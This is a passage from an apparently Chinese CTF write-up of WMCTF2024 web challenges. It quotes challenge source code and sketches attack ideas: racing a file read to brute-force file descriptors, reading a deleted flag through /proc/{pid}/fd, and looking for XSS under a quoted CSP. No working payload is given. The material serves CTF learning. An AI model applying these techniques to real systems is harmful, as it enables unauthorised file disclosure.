punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">new</span> <span class="token class-name">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Start server faild:\n"</span> <span class="token operator">+</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„åˆ°ä¸€ä¸ªæœ‰è¶£çš„åœ°æ–¹ï¼Œè¿™é‡Œæ–‡ä»¶è¯»å–çš„æ‰§è¡Œé¡ºåºæ˜¯ï¼šå…ˆè¯»å–å†åˆ¤æ–­ page æ˜¯å¦ä¸º flag</p><p>è€Œ<code>fs.read(b)</code>å’Œ<code>fs.close()</code>ä¹‹é—´å­˜åœ¨å¯ä»¥ç«äº‰çš„æœºä¼š</p><p>é‚£ä¹ˆåªéœ€è¦æˆ‘ä»¬ä¸æ–­è¯·æ±‚ &#x2F;flagï¼Œç„¶åçˆ†ç ´ fd å¥æŸ„å°±èƒ½è¯»åˆ° &#x2F;flag</p><p>ï¼ˆæ€ªäº‹ï¼Œdockeræ‹‰ä¸ä¸‹æ¥æ²¡å¾—å¤ç°ï¼‰</p><hr><h1 id="YourWAï¼ˆUnsolvedï¼‰"><a href="#YourWAï¼ˆUnsolvedï¼‰" class="headerlink" title="YourWAï¼ˆUnsolvedï¼‰"></a>YourWAï¼ˆUnsolvedï¼‰</h1><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token comment">// ! part of index.ts</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> $ <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"bun"</span><span class="token keyword">await</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'node:fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">async</span> fs <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> $<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">echo $FLAG > ./flag.txt</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">quiet</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fs<span class="token punctuation">.</span><span class="token function">openSync</span><span class="token punctuation">(</span><span class="token string">'./flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> $<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">rm ./flag.txt</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">quiet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">const</span> server <span class="token operator">=</span> Bun<span class="token punctuation">.</span><span class="token function">serve</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    port<span class="token operator">:</span> <span class="token number">3031</span><span class="token punctuation">,</span>    <span class="token keyword">async</span> <span class="token function">fetch</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// ... Collapsed</span>        <span class="token keyword">return</span> Res<span class="token punctuation">.</span><span class="token function">NotFound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">return</span> Res<span class="token punctuation">.</span><span class="token function">NotFound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ flagäº†ï¼Œå‘ç°<code>fs.openSync(&#39;./flag.txt&#39;, &#39;r&#39;)</code>æ²¡å…³é—­å¥æŸ„å°±åˆ ï¼Œé‚£å°±å»&#x2F;proc&#x2F;{pid}&#x2F;fdé‡Œé¢æ‰¾å°±è¡Œ</p><hr><h1 id="Spectreï¼ˆUnsolvedï¼‰"><a href="#Spectreï¼ˆUnsolvedï¼‰" class="headerlink" title="Spectreï¼ˆUnsolvedï¼‰"></a>Spectreï¼ˆUnsolvedï¼‰</h1><p>xä¸åŠ¨ä¸€ç‚¹</p><p>hintï¼š</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token title important"><span class="token punctuation">#</span> Hints</span>There's no RCE, R/W. Only XSS.<span class="token title important"><span class="token punctuation">##</span> Run program</span>To run the program with all development features, you can use the following commands:<span class="token code"><span class="token punctuation">```</span><span class="token code-language">shell</span><span class="token code-block language-shell">pnpm installpnpm buildpnpm test # or `pnpm run start:dev`</span><span class="token punctuation">```</span></span>It's recommended to visit the program on localhost or over HTTPS, for some features only work on them due to browser security policies.<span class="token title important"><span class="token punctuation">##</span> Fast reading</span>The following hints may help you locate the important codes more quickly:<span class="token list punctuation">-</span> Line in <span class="token code-snippet code keyword">`app.main.mjs:238`</span><span class="token list punctuation">-</span> Function in <span class="token code-snippet code keyword">`src/middleware.mjs:102`</span><span class="token list punctuation">-</span> Function in <span class="token code-snippet code keyword">`src/middleware.mjs:112`</span><span class="token list punctuation">-</span> Line in <span class="token code-snippet code keyword">`app.assets.mjs:32`</span><span class="token title important"><span class="token punctuation">##</span> Project structure</span>Followings are the structure of this project:<span class="token list punctuation">-</span> <span class="token code-snippet code keyword">`app.main.mjs`</span>: Main application<span class="token list punctuation">-</span> <span class="token code-snippet code keyword">`app.assets.mjs`</span>: Static assets (local visit only)<span class="token list punctuation">-</span> <span class="token code-snippet code keyword">`src/`</span>: Back-end source code<span class="token list punctuation">-</span> <span class="token code-snippet code keyword">`public-src/`</span>: Front-end source code<span class="token list punctuation">-</span> <span class="token code-snippet code keyword">`views/`</span>: Front-end HTML templates<span class="token list punctuation">-</span> <span class="token code-snippet code keyword">`public/`</span>: Front-end build output<span class="token list punctuation">-</span> <span class="token code-snippet code keyword">`assets/`</span>: Static assets (local visit only)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çº¯XSSå•Šã€‚ã€‚ã€‚</p><p>æ‰¾ä¸€ä¸‹flagåœ¨å“ª</p><p>app.main.mjs</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">root<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> cors<span class="token punctuation">,</span> csp<span class="token punctuation">,</span> ensureAdmin<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// let flag = fs.readFileSync('flag.txt');</span>    <span class="token keyword">let</span> flag <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token operator">?.</span><span class="token constant">FLAG</span> <span class="token operator">||</span> <span class="token string">'flag&#123;test_flag&#125;'</span><span class="token punctuation">;</span>    ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;pre>&lt;code></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>flag<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/code>&lt;/pre></span><span class="token template-punctuation string">`</span></span>    ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·Ÿä¸€ä¸‹ensureAdmin</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @type &#123;Koa.Middleware&#125; */</span><span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ensureAdmin</span><span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> tokenData <span class="token operator">=</span> <span class="token function">parseTokenData</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tokenData <span class="token operator">||</span> tokenData<span class="token punctuation">.</span>role <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> ctx<span class="token punctuation">.</span><span class="token function">throw</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    ctx<span class="token punctuation">.</span>token <span class="token operator">=</span> tokenData<span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦éªŒtokenæ˜¯å¦ä¸º admin çš„</p><p>æ‰¾ä¸€ä¸‹åˆ›å»º admin çš„ä½ç½®ï¼Œåœ¨bot.mjs</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createRandomUser</span><span class="token punctuation">(</span><span class="token parameter">role<span class="token punctuation">,</span> overflow <span class="token operator">=</span> <span class="token number">0</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// never conflict on client side if overflow > 0</span>    <span class="token keyword">const</span> alphabet <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> uid <span class="token operator">=</span> <span class="token function">randomString</span><span class="token punctuation">(</span>alphabet<span class="token punctuation">,</span> <span class="token number">10</span> <span class="token operator">+</span> overflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> password <span class="token operator">=</span> <span class="token function">randomString</span><span class="token punctuation">(</span>alphabet<span class="token punctuation">,</span> <span class="token number">20</span> <span class="token operator">+</span> overflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> password_sha256 <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Storage<span class="token punctuation">.</span>account<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>uid<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">password</span><span class="token operator">:</span> password_sha256<span class="token punctuation">,</span> <span class="token literal-property property">role</span><span class="token operator">:</span> role <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> uid<span class="token punctuation">,</span> password<span class="token punctuation">,</span> password_sha256<span class="token punctuation">,</span> role <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">genDefaultAccount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"------ Default Account ------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> d <span class="token operator">=</span> <span class="token function">createRandomUser</span><span class="token punctuation">(</span><span class="token string">'developer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Developer uid: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>d<span class="token punctuation">.</span>uid<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Developer password: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>d<span class="token punctuation">.</span>password<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Developer password sha256: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>d<span class="token punctuation">.</span>password_sha256<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token function">createRandomUser</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Admin uid: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>a<span class="token punctuation">.</span>uid<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Admin password: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>a<span class="token punctuation">.</span>password<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Admin password sha256: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>a<span class="token punctuation">.</span>password_sha256<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"-----------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Config<span class="token punctuation">[</span><span class="token string">"generate_default_account"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">genDefaultAccount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·Ÿä¸€ä¸‹ Config ï¼Œåˆ°config.mjs</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>    <span class="token string-property property">"main_port"</span><span class="token operator">:</span> <span class="token number">3000</span><span class="token punctuation">,</span>    <span class="token string-property property">"assets_port"</span><span class="token operator">:</span> <span class="token number">3001</span><span class="token punctuation">,</span>    <span class="token comment">// "token_key": process.env["TOKEN_KEY"] || "h1LxPW90aJehe6sV",</span>    <span class="token string-property property">"token_key"</span><span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">[</span><span class="token string">"TOKEN_KEY"</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token function">randomTokenKey</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string-property property">"placeholder_code_default"</span><span class="token operator">:</span> <span class="token string">"&lt;!-- Write your code here -->"</span><span class="token punctuation">,</span>    <span class="token string-property property">"placeholder_code_404"</span><span class="token operator">:</span> <span class="token string">"&lt;!-- This is not what you are looking for -->"</span><span class="token punctuation">,</span>    <span class="token string-property property">"default_role"</span><span class="token operator">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span>    <span class="token string-property property">"bot_visit_timeout"</span><span class="token operator">:</span> <span class="token number">30</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">,</span>    <span class="token string-property property">"generate_default_account"</span><span class="token operator">:</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">[</span><span class="token string">"NODE_ENV"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"development"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token string-property property">"cf_turnstile"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"enable"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token string-property property">"site_key"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>        <span class="token string-property property">"secret_key"</span><span class="token operator">:</span> <span class="token string">""</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä¸‹cspï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @type &#123;Koa.Middleware&#125; */</span><span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">csp</span><span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> nonce <span class="token operator">=</span> ctx<span class="token punctuation">.</span>nonce <span class="token operator">||</span>        crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[^a-zA-Z0-9]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// let srcOriginPrefix = ctx.request.protocol + "://" + ctx.request.host.split(":")[0];</span>    <span class="token keyword">let</span> srcOriginPrefix <span class="token operator">=</span> <span class="token string">'http://localhost'</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> assetsSrc <span class="token operator">=</span> srcOriginPrefix <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> Config<span class="token punctuation">[</span><span class="token string">"assets_port"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>        <span class="token punctuation">[</span><span class="token string">'default-src'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">'self'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'script-src'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">'nonce-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'blob:'</span><span class="token punctuation">,</span> assetsSrc<span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'worker-src'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">'self'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'blob:'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'style-src'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">'nonce-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'blob:'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'connect-src'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">'self'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'https:'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'object-src'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">'none'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'base-uri'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">'self'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'frame-src'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">'self'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'https://challenges.cloudflare.com'</span><span class="token punctuation">]</span>    <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">a</span> <span class="token operator">=></span> a<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è½¬æˆè¯·æ±‚å¤´çš„å½¢å¼ä¸¢ç»™<a href="https://csp-evaluator.withgoogle.com/">Google CSP Evaluator</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token operator">:</span> <span class="token keyword">default</span><span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span> script<span class="token operator">-</span>src <span class="token string">'nonce-&#123;nonce&#125;'</span> <span class="token literal-property property">blob</span><span class="token operator">:</span> assetsSrc<span class="token punctuation">;</span> worker<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token literal-property property">blob</span><span class="token operator">:</span><span class="token punctuation">;</span> style<span class="token operator">-</span>src <span class="token string">'nonce-&#123;nonce&#125;'</span> <span class="token literal-property property">blob</span><span class="token operator">:</span><span class="token punctuation">;</span> connect<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token punctuation">;</span> object<span class="token operator">-</span>src <span class="token string">'none'</span><span class="token punctuation">;</span> base<span class="token operator">-</span>uri <span class="token string">'self'</span><span class="token punctuation">;</span> frame<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>challenges<span class="token punctuation">.</span>cloudflare<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/09/07/WMCTF2024/image-20240907092031521.png" alt="image-20240907092031521"></p><p>å®Œå…¨æ²¡æ€è·¯å•Šã€‚ã€‚</p><hr><h1 id="EzQlï¼ˆUnsolvedï¼‰"><a href="#EzQlï¼ˆUnsolvedï¼‰" class="headerlink" title="EzQlï¼ˆUnsolvedï¼‰"></a>EzQlï¼ˆUnsolvedï¼‰</h1><hr><h1 id="BlackJackï¼ˆUnsolvedï¼‰"><a href="#BlackJackï¼ˆUnsolvedï¼‰" class="headerlink" title="BlackJackï¼ˆUnsolvedï¼‰"></a>BlackJackï¼ˆUnsolvedï¼‰</h1><blockquote><p>hint1:CVE-2024-21733 2:POST Upload file</p></blockquote><p>åªæœ‰ä¸€ä¸ªè·¯ç”±ï¼Ÿ</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/check"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">adminAccess</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"local.server.port"</span><span class="token punctuation">,</span> <span class="token string">"8080"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> flag <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"ICQ_FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> targetUrl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:"</span> <span class="token operator">+</span> port <span class="token operator">+</span> <span class="token string">"/where_is_my_flag"</span><span class="token punctuation">;</span>    <span class="token class-name">HttpHeaders</span> headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    headers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"Host"</span><span class="token punctuation">,</span> <span class="token string">"127.0.0.1:"</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>    headers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"accept-language"</span><span class="token punctuation">,</span> <span class="token string">"zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    headers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"accept"</span><span class="token punctuation">,</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"</span><span class="token 